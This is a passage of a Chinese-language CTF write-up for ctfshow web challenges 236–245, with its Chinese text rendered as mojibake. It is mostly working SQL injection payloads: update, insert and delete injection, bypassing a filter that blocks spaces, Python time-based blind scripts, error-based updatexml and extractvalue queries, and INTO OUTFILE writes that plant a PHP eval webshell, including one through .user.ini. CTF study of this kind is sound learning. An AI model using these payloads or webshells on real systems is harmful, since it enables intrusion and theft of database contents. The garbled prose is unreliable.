<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//åˆ†é¡µæŸ¥è¯¢
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//è¿‡æ»¤ or &#39; 
</span></span></span></code></pre></div><p><strong>or &lsquo;</strong> è¢«ç¦å¯¼è‡´inf<strong>or</strong>mation_schema.tablesä¹Ÿè¢«ç¦äº†</p>
<p>å¯¼è‡´æˆ‘ä»¬æ²¡åŠæ³•æŸ¥è¯¢åˆ—</p>
<p>è¿™ç§æƒ…å†µæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ ï¼š<a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹</a></p>
<blockquote>
<p>åœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql ä¸­ï¼Œè¿˜æœ‰ INNODB_TABLES åŠ <a href="https://zhida.zhihu.com/search?content_id=109954541&amp;content_type=Article&amp;match_order=1&amp;q=INNODB_COLUMNS&amp;zhida_source=entity">INNODB_COLUMNS</a> ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</p></blockquote>
<p>è¯»è¡¨</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\
</code></pre><p>æŸ¥å­—æ®µ</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\
</code></pre><h4 id="web236">web236<a hidden class="anchor" aria-hidden="true" href="#web236">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//åˆ†é¡µæŸ¥è¯¢
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//è¿‡æ»¤ or &#39; flag
</span></span></span></code></pre></div><p>è¯»è¡¨</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\

//banlist,ctfshow_user,flaga
</code></pre><p>è¯»å­—æ®µ</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#&amp;password=\
</code></pre><p>è¿™é¢˜æ–°å¢çš„flagè¿‡æ»¤ï¼Œä½†æ˜¯å®é™…ä¸Šæ²¡æœ‰å½±å“ï¼Œæˆ–è®¸æ˜¯è¿‡æ»¤è¿”å›çš„å†…å®¹ï¼Ÿ</p>
<h4 id="insertæ³¨å…¥">insertæ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#insertæ³¨å…¥">#</a></h4>
<h4 id="web237">web237<a hidden class="anchor" aria-hidden="true" href="#web237">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//æ’å…¥æ•°æ®
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span></code></pre></div><p>insertå‡½æ•°ç”¨äºæ’å…¥å€¼</p>
<p>å…¶å®è·Ÿupdateæ³¨å…¥å·®ä¸å¤š</p>
<p>payload:</p>
<p>è¯»è¡¨å</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
</code></pre><p><img alt="image-20250218102751491" loading="lazy" src="./assets/image-20250218102751491.png"></p>
<p>æŸ¥åˆ—å</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));#

//id,flagass23s3,info
</code></pre><p>çˆ†å­—æ®µ</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select flagass23s3 from flag));#
</code></pre><h4 id="web238">web238<a hidden class="anchor" aria-hidden="true" href="#web238">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//æ’å…¥æ•°æ®
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//è¿‡æ»¤ç©ºæ ¼
</span></span></span></code></pre></div><p>æµ‹äº†ä¸€ä¸‹å‘ç°ä¸æ­¢æ˜¯ç©ºæ ¼ï¼Œè¿åŒä¸€äº›ä»£æ›¿ç©ºæ ¼çš„å­—ç¬¦ä¹Ÿè¢«ä¸€åŒwafäº†ï¼Œæ¯”å¦‚/**/</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘<strong>ç”¨æ‹¬å·ä»£æ›¿ç©ºæ ¼</strong></p>
<p>payload</p>
<pre tabindex="0"><code>#è·å–è¡¨å
username=1&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23&amp;password=1

#è·å–åˆ—å
username=1&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)))%23&amp;password=1

#è·å–æ•°æ®
username=1&#39;,(select(group_concat(flag))from(flagb)))%23&amp;password=1
</code></pre><h4 id="web239">web239<a hidden class="anchor" aria-hidden="true" href="#web239">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //æ’å…¥æ•°æ®
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
è¿”å›é€»è¾‘

  //è¿‡æ»¤ç©ºæ ¼ or 
</code></pre><p>payload:</p>
<p>è¯»è¡¨</p>
<pre tabindex="0"><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1
</code></pre><p>ç”±äº*è¢«banæ‰äº†ï¼Œæ²¡åŠæ³•ç”¨ä¹‹å‰æ— åˆ—åçˆ†å­—æ®µçš„æ–¹æ³•</p>
<p>è¿™é‡ŒçŒœæµ‹åˆ—åä¸ºflagï¼Œç›´æ¥è¯»</p>
<pre tabindex="0"><code>username=1&#39;,(select(flag)from(flagbb)))#&amp;password=1
</code></pre><h4 id="web240">web240<a hidden class="anchor" aria-hidden="true" href="#web240">#</a></h4>
<pre tabindex="0"><code>Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a/bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™
</code></pre><pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //æ’å…¥æ•°æ®
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
è¿”å›é€»è¾‘

  //è¿‡æ»¤ç©ºæ ¼ or sys mysql
</code></pre><p>æ ¹æ®hintå¯ä»¥çŸ¥é“æ˜¯è¦çˆ†ç ´è¡¨å</p>
<p>æ‹¿y4âœŒçš„è„šæœ¬æ”¹ä¸€ä¸‹</p>
<pre tabindex="0"><code>&#34;&#34;&#34;
Author:Y4tacker
&#34;&#34;&#34;
import random
import requests

url = &#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show&#34;
url_insert = url + &#34;/api/insert.php&#34;
url_flag = url + &#34;/api/?page=1&amp;limit=1000&#34;


# çœ‹å‘½å‡½æ•°
def generate_random_str():
    sttr = &#39;ab&#39;
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = &#39;&#39;.join(str_list)
    return random_str


while 1:
    data = {
        &#39;username&#39;: f&#34;1&#39;,(select(flag)from(flag{generate_random_str()})))#&#34;,
        &#39;password&#39;: &#34;&#34;
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if &#34;ctfshow{&#34; in r2.text:
        for i in r2.json()[&#39;data&#39;]:
            if  &#34;ctfshow{&#34; in i[&#39;pass&#39;]:
                print(i[&#39;pass&#39;])
                break
        break
</code></pre><h4 id="web241">web241<a hidden class="anchor" aria-hidden="true" href="#web241">#</a></h4>
<pre tabindex="0"><code>sqlè¯­å¥

  //åˆ é™¤è®°å½•
  $sql = &#34;delete from  ctfshow_user where id = {$id}&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤
</code></pre><p>deleteæ³¨å…¥ï¼Œdeleteå‡½æ•°é¡¾åæ€ä¹‰å°±æ˜¯ä»æ•°æ®åº“ä¸­åˆ é™¤å†…å®¹</p>
<p>æ³¨å…¥ç‚¹åœ¨whereåé¢ï¼Œå¯ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨æˆ–è€…å¸ƒå°”ç›²æ³¨ï¼Œä½†æ˜¯ç”±äºdeleteä¼šåˆ é™¤æ•°æ®åº“ä¸­çš„è®°å½•ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå‡ºç°è®°å½•éƒ½åˆ å®Œäº†ä½†æ˜¯flagè¿˜æ²¡æ³¨å‡ºæ¥çš„æƒ…å†µ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nb">min</span><span class="p">,</span><span class="nb">max</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">128</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="nb">min</span> <span class="o">+</span> <span class="p">(</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">min</span> <span class="o">==</span> <span class="n">j</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="nb">str</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># çˆ†è¡¨å</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.03),1)#&#39;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># çˆ†åˆ—</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),{i},1))&lt;{j},sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># çˆ†å€¼</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select group_concat(flag) from flag),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&lt;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">sub</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span> <span class="n">sub</span> <span class="o">&gt;=</span> <span class="mf">0.2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="nb">max</span> <span class="o">=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="nb">min</span> <span class="o">=</span> <span class="n">j</span>
</span></span></code></pre></div><p>ä¸ºä»€ä¹ˆsleepè®¾å®šçš„æ˜¯0.03ï¼Œä½†æ˜¯è¶…æ—¶æ—¶é—´æ˜¯å¤§äº0.2å‘¢</p>
<p>é‚£æ˜¯å› ä¸ºè¦å¯¹æ‰€æœ‰è®°å½•éƒ½ç®—ä¸€é if</p>
<p>é‚£æˆ‘ä»¬æ€ä¹ˆæµ‹è¯•è¿™ä¸ªæ—¶é—´å‘¢ï¼Œè¿™é‡Œæ”¾ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬</p>
<p><a href="https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/">Practice - CTFSHOW WEBå…¥é—¨ SQLæ³¨å…¥ç¯‡</a></p>
<pre tabindex="0"><code>url = &#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php&#39;


def test2() -&gt; float:
    rand = random.random()
    time_s = time.time()
    _ = requests.post(url,data={&#34;id&#34;: f&#34;if({1 if rand &gt; 0.5 else 0},sleep(0.05),0)&#34;})
    time_e = time.time()
    return (rand &gt; 0.5, time_e - time_s)

print([test() for _ in range(30)])
</code></pre><p>æˆ‘æµ‹å‡ºæ¥çš„ç»“æœ</p>
<pre tabindex="0"><code>[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)]
</code></pre><p>åœ¨falseå’Œtrueä¹‹é—´é€‰å–ä¸€ä¸ªåˆé€‚çš„å€¼å³å¯ï¼Œç›®çš„æ˜¯èƒ½å¤Ÿè¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘è¿™é‡Œé€‰å–äº†0.2</p>
<h4 id="æ–‡ä»¶æ³¨å…¥">æ–‡ä»¶æ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#æ–‡ä»¶æ³¨å…¥">#</a></h4>
<h4 id="web242">web242<a hidden class="anchor" aria-hidden="true" href="#web242">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//å¤‡ä»½è¡¨
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span></code></pre></div><pre tabindex="0"><code>outfileçš„è¯­æ³•

SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY &#39;string&#39;]//åˆ†éš”ç¬¦
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]

----------------------------------------------------
â€œOPTIONâ€å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š

FIELDS TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚

FIELDS ENCLOSED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚

FIELDS OPTIONALLY ENCLOSED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚

FIELDS ESCAPED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚

LINES STARTING BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚

LINES TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚
</code></pre><p>æ¼æ´çš„æ³¨å…¥ç‚¹æ˜¯ç”±äºæ•°æ®åº“çš„å¯¼å‡ºåŠŸèƒ½</p>
<p><img alt="image-20250218160941925" loading="lazy" src="./assets/image-20250218160941925.png"></p>
<p>æ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>payload:</p>
<pre tabindex="0"><code>filename=1.php&#39; LINES STARTING BY &#39;&lt;?php eval($_POST[1]);?&gt;&#39;#
</code></pre><p><img alt="image-20250218161133251" loading="lazy" src="./assets/image-20250218161133251.png"></p>
<p><img alt="image-20250218161332604" loading="lazy" src="./assets/image-20250218161332604.png"></p>
<h4 id="web243">web243<a hidden class="anchor" aria-hidden="true" href="#web243">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//å¤‡ä»½è¡¨
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//è¿‡æ»¤äº†php
</span></span></span></code></pre></div><p>å°è¯•ä¸€ä¸‹.user.iniæ–‡ä»¶åŒ…å«</p>
<pre tabindex="0"><code>filename=.user.ini&#39; lines starting by &#39;auto_prepend_file=1.txt\n&#39;%23
filename=1.txt&#39; lines starting by &#39;&lt;?=eval($_POST[1])?&gt;&#39;%23
</code></pre><p><img alt="image-20250218165925067" loading="lazy" src="./assets/image-20250218165925067.png"></p>
<h4 id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#æŠ¥é”™æ³¨å…¥">#</a></h4>
<p><a href="https://blog.csdn.net/2401_89233381/article/details/144308798">æ–°æ‰‹å°ç™½å…¥é—¨â€”â€”SQLæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥_sqlæ³¨å…¥æŠ¥é”™æ³¨å…¥-CSDNåšå®¢</a></p>
<h4 id="web244">web244<a hidden class="anchor" aria-hidden="true" href="#web244">#</a></h4>
<pre tabindex="0"><code>sqlè¯­å¥

  //å¤‡ä»½è¡¨
  $sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 1;&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤
</code></pre><p>updatexmlæŠ¥é”™æ³¨å…¥</p>
<p>payload</p>
<pre tabindex="0"><code>/api/?id=&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23
#ctfshow{89982b11-5c7d-4215-a78
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23
#9-a9f8ecc8f1b1}
# æ•°æ®é•¿åº¦æœ‰é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨substræ¥æˆªå–


//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1}
</code></pre><h4 id="web245">web245<a hidden class="anchor" aria-hidden="true" href="#web245">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sqlè¯­å¥</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//æ— è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">è¿‡æ»¤updatexml</span>
</span></span></code></pre></div><p>extractvalueæŠ¥é”™æ³¨å…¥</p>
<p>payload</p>
<pre tabindex="0"><code>æŸ¥æ•°æ®åº“åï¼šid=&#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23

çˆ†è¡¨åï¼šid=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23
//ctfshow_flagsa

çˆ†å­—æ®µåï¼šid=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;ctfshow_flagsa&#34;))))%23
//flag1

çˆ†æ•°æ®ï¼š
